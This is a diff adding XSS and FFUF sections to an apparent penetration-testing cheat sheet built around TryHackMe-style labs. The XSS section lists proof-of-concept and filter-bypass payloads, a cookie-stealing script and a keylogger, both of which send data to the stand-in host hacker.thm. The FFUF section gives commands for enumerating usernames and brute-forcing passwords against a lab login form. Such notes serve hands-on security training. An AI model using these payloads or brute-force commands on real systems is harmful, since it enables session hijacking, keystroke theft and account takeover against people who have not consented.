@@ -96,6 +96,45 @@ sublist3r.py -d <DOMAIN>
 
 ----
 
+# XSS
+
+- POC
+````
+<script>alert('XSS');</script>
+"><script>alert('THM');</script>
+</textarea><script>alert('THM');</script>
+';alert('THM');//
+<sscriptcript>alert('THM');</sscriptcript>
+/images/cat.jpg" onload="alert('THM');
+````
+- Session stealing
+````
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+````
+- Key logger
+````
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+````
+- Business Logic: (attacke a specific function)
+````
+<script><FUNCTION_TO_ATTACK('<ARGUMENT>');</script>
+````
+----
+
+# FFUF
+
+- List usernames :
+````
+ffuf -w ~/Bureau/Hack_Tools/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.30.206/customers/signup -mr "username already exists"
+````
+
+- Find Password :
+````
+ffuf -w names.txt:W1,/home/jbertin/Bureau/Hack_Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.30.206/customers/login -fc 200
+````
+
+----
+
 # Crunch 
 
 Password combinaison generator
